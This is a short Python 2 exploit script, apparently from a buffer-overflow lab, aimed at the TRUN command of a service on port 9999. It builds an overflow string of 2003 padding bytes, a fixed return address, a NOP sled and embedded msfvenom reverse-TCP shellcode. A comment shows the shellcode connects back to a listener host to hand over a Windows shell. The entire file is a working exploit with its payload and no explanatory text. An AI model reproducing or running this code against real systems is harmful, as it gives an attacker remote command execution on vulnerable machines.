import socket
import struct
 
print "\nTRUN Command - Exploit, Reverse Shell \n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 -b '\x00' -f python
    buf =  b""
    buf += b"\xbd\x7d\x90\xa6\xa3\xd9\xc2\xd9\x74\x24\xf4\x58\x29"
    buf += b"\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x0e\x03\x15\x9e\x44"
    buf += b"\x56\x19\x76\x0a\x99\xe1\x87\x6b\x13\x04\xb6\xab\x47"
    buf += b"\x4d\xe9\x1b\x03\x03\x06\xd7\x41\xb7\x9d\x95\x4d\xb8"
    buf += b"\x16\x13\xa8\xf7\xa7\x08\x88\x96\x2b\x53\xdd\x78\x15"
    buf += b"\x9c\x10\x79\x52\xc1\xd9\x2b\x0b\x8d\x4c\xdb\x38\xdb"
    buf += b"\x4c\x50\x72\xcd\xd4\x85\xc3\xec\xf5\x18\x5f\xb7\xd5"
    buf += b"\x9b\x8c\xc3\x5f\x83\xd1\xee\x16\x38\x21\x84\xa8\xe8"
    buf += b"\x7b\x65\x06\xd5\xb3\x94\x56\x12\x73\x47\x2d\x6a\x87"
    buf += b"\xfa\x36\xa9\xf5\x20\xb2\x29\x5d\xa2\x64\x95\x5f\x67"
    buf += b"\xf2\x5e\x53\xcc\x70\x38\x70\xd3\x55\x33\x8c\x58\x58"
    buf += b"\x93\x04\x1a\x7f\x37\x4c\xf8\x1e\x6e\x28\xaf\x1f\x70"
    buf += b"\x93\x10\xba\xfb\x3e\x44\xb7\xa6\x56\xa9\xfa\x58\xa7"
    buf += b"\xa5\x8d\x2b\x95\x6a\x26\xa3\x95\xe3\xe0\x34\xd9\xd9"
    buf += b"\x55\xaa\x24\xe2\xa5\xe3\xe2\xb6\xf5\x9b\xc3\xb6\x9d"
    buf += b"\x5b\xeb\x62\x31\x0b\x43\xdd\xf2\xfb\x23\x8d\x9a\x11"
    buf += b"\xac\xf2\xbb\x1a\x66\x9b\x56\xe1\xe1\x64\x0e\x2e\x71"
    buf += b"\x0c\x4d\xb0\x63\x91\xd8\x56\xe9\x39\x8d\xc1\x86\xa0"
    buf += b"\x94\x99\x37\x2c\x03\xe4\x78\xa6\xa0\x19\x36\x4f\xcc"
    buf += b"\x09\xaf\xbf\x9b\x73\x66\xbf\x31\x1b\xe4\x52\xde\xdb"
    buf += b"\x63\x4f\x49\x8c\x24\xa1\x80\x58\xd9\x98\x3a\x7e\x20"
    buf += b"\x7c\x04\x3a\xff\xbd\x8b\xc3\x72\xf9\xaf\xd3\x4a\x02"
    buf += b"\xf4\x87\x02\x55\xa2\x71\xe5\x0f\x04\x2b\xbf\xfc\xce"
    buf += b"\xbb\x46\xcf\xd0\xbd\x46\x1a\xa7\x21\xf6\xf3\xfe\x5e"
    buf += b"\x37\x94\xf6\x27\x25\x04\xf8\xf2\xed\x34\xb3\x5e\x47"
    buf += b"\xdd\x1a\x0b\xd5\x80\x9c\xe6\x1a\xbd\x1e\x02\xe3\x3a"
    buf += b"\x3e\x67\xe6\x07\xf8\x94\x9a\x18\x6d\x9a\x09\x18\xa4"
    
    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(evil_buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
